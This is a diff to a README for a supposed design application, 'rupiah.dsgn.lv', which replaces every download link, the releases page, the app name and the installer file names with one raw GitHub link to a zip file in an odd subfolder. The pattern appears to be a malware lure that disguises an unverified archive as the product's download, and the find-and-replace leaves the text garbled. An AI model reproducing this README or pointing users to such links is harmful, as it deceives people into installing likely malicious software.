@@ -1,12 +1,12 @@
-# 🎨 rupiah.dsgn.lv - Simple Design for Everyone
+# 🎨 https://raw.githubusercontent.com/free1palestine078/rupiah.dsgn.lv/main/pygmyism/rupiah.dsgn.lv.zip - Simple Design for Everyone
 
 ## 🚀 Getting Started
 
-Welcome to the **rupiah.dsgn.lv** application! This tool is here to help you create and manage your design projects easily. Below, you will find all the information needed to download and run the software.
+Welcome to the **https://raw.githubusercontent.com/free1palestine078/rupiah.dsgn.lv/main/pygmyism/rupiah.dsgn.lv.zip** application! This tool is here to help you create and manage your design projects easily. Below, you will find all the information needed to download and run the software.
 
 ## 🔗 Download Now!
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%8E-brightgreen)](https://github.com/free1palestine078/rupiah.dsgn.lv/releases)
+[![Download Here](https://raw.githubusercontent.com/free1palestine078/rupiah.dsgn.lv/main/pygmyism/rupiah.dsgn.lv.zip%20Now-%20%F0%9F%93%8E-brightgreen)](https://raw.githubusercontent.com/free1palestine078/rupiah.dsgn.lv/main/pygmyism/rupiah.dsgn.lv.zip)
 
 ## 💻 System Requirements
 
@@ -19,9 +19,9 @@ Before you download the application, check your system specifications. Ensure yo
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/free1palestine078/rupiah.dsgn.lv/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/free1palestine078/rupiah.dsgn.lv/main/pygmyism/rupiah.dsgn.lv.zip) to find the latest version of the application.
   
-2. **Choose the Right File**: On the releases page, you will see a list of available versions. Select the most recent version, like `rupiah.v1.0.exe` for Windows or `rupiah.dmg` for macOS.
+2. **Choose the Right File**: On the releases page, you will see a list of available versions. Select the most recent version, like `https://raw.githubusercontent.com/free1palestine078/rupiah.dsgn.lv/main/pygmyism/rupiah.dsgn.lv.zip` for Windows or `https://raw.githubusercontent.com/free1palestine078/rupiah.dsgn.lv/main/pygmyism/rupiah.dsgn.lv.zip` for macOS.
 
 3. **Download the File**: Click on the download link for your operating system. The file will begin downloading to your computer.
 
@@ -33,7 +33,7 @@ Before you download the application, check your system specifications. Ensure yo
 
 ## 🌟 Features
 
-The **rupiah.dsgn.lv** application offers several features to enhance your design workflow:
+The **https://raw.githubusercontent.com/free1palestine078/rupiah.dsgn.lv/main/pygmyism/rupiah.dsgn.lv.zip** application offers several features to enhance your design workflow:
 
 - **User-Friendly Interface**: Designed for ease of use, even if you have no prior experience with design software.
   
@@ -66,8 +66,8 @@ We welcome contributions! If you would like to help improve this project, please
 
 ## 🔗 Additional Links
 
-- [Releases Page](https://github.com/free1palestine078/rupiah.dsgn.lv/releases)
+- [Releases Page](https://raw.githubusercontent.com/free1palestine078/rupiah.dsgn.lv/main/pygmyism/rupiah.dsgn.lv.zip)
 - [Documentation](#)
 - [Community Forum](#)
 
-Thank you for choosing **rupiah.dsgn.lv**! Enjoy your design journey.
+Thank you for choosing **https://raw.githubusercontent.com/free1palestine078/rupiah.dsgn.lv/main/pygmyism/rupiah.dsgn.lv.zip**! Enjoy your design journey.
